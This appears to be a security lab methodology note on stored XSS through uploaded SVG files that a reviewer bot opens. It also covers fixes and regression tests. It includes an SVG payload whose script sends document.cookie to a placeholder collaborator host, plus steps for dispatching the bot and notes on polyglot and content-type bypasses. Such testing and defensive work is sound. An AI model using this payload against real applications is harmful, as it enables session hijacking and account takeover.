# Stored XSS Through SVG Upload And Review Bots

## Date

2026-07-08

## Target Type

Web applications with image/file upload and curator/admin/reviewer bots

## Bug Class

Stored XSS, unsafe SVG handling, upload validation weakness, bot abuse, cookie disclosure

## Initial Signal

An app accepts image uploads and later serves them from its own origin. Lab copy may mention:

- binder / gallery / letterpress
- share the link
- curator reviews each new arrival
- moderator/admin inspects uploads

There is often an API to notify the reviewer about a specific upload hash or file ID.

## Working Theory

SVG is XML and can contain executable script or event handlers. If the app accepts `.svg`, stores it unchanged, and serves it from `/uploads/...` or similar, direct navigation to the file may execute attacker JavaScript in the app origin.

A reviewer bot that opens the uploaded file URL provides the victim path for impact proof.

## Trust Boundary

User uploads must not become active documents on the application origin unless strictly sanitized. Review bots must not execute untrusted file content with privileged cookies attached.

## Minimal Reproduction

1. Upload a harmless SVG script proof.
2. Confirm the returned URL serves the script unchanged.
3. Identify the reviewer trigger endpoint (`/api/send`, `/api/report`, etc.).
4. Dispatch the bot against the uploaded hash or URL.
5. Exfiltrate `document.cookie` or perform a harmless same-origin proof.

Example SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script><![CDATA[
fetch('https://[collaborator]?c='+encodeURIComponent(document.cookie));
]]></script>
</svg>
```

## Alternate Upload XSS Paths

PNG/JPEG polyglot:

- file begins with image magic bytes
- trailing HTML/script appended
- sometimes needs `response-content-type=text/html` on object storage

HTML/disguised extensions:

- blocked in safer apps
- worth one test if validation is extension-only

MIME/type confusion:

- `Content-Type: image/svg+xml` still parses as active XML

## Why Failed Tests May Fail

- SVG is rasterized or sanitized server-side.
- Uploads are served from a cookieless CDN origin.
- Review bot only fetches metadata or thumbnails.
- Scripts inside SVG are stripped.
- Sensitive cookies are `HttpOnly`, requiring in-origin fetch instead of `document.cookie`.
- Browser blocks inline SVG script in the specific viewing context.

## Why Working Test Works

The app stores attacker-controlled XML and later serves it from the same site that set the privileged cookie. The reviewer bot loads the file as a top-level document or active XML resource, so embedded script runs before any user interaction.

## Impact

- Stored XSS against staff/curator bots.
- Session or flag cookie theft.
- Same-origin actions as the reviewer user.
- Potential propagation if uploaded files are shown inline to other users.

## Fix

- Disallow SVG uploads when not required.
- Sanitize SVG with a strict allowlist and remove script/event handlers.
- Re-encode accepted raster images server-side.
- Serve uploads from an isolated origin.
- Set `HttpOnly` on sensitive cookies.
- Make review bots analyze metadata/thumbnails only.

## Regression Test

- SVG containing `<script>` is rejected or sanitized with no script in stored object.
- Reviewer bot sessions do not execute uploaded active content.
- Sensitive cookies are not readable from uploaded-file execution contexts.
- PNG polyglot and `response-content-type` override paths also fail if object storage is in use.

## Future Checklist Item

On upload labs with reviewer bots, test direct SVG script upload before PNG polyglot or S3 response-header override work.
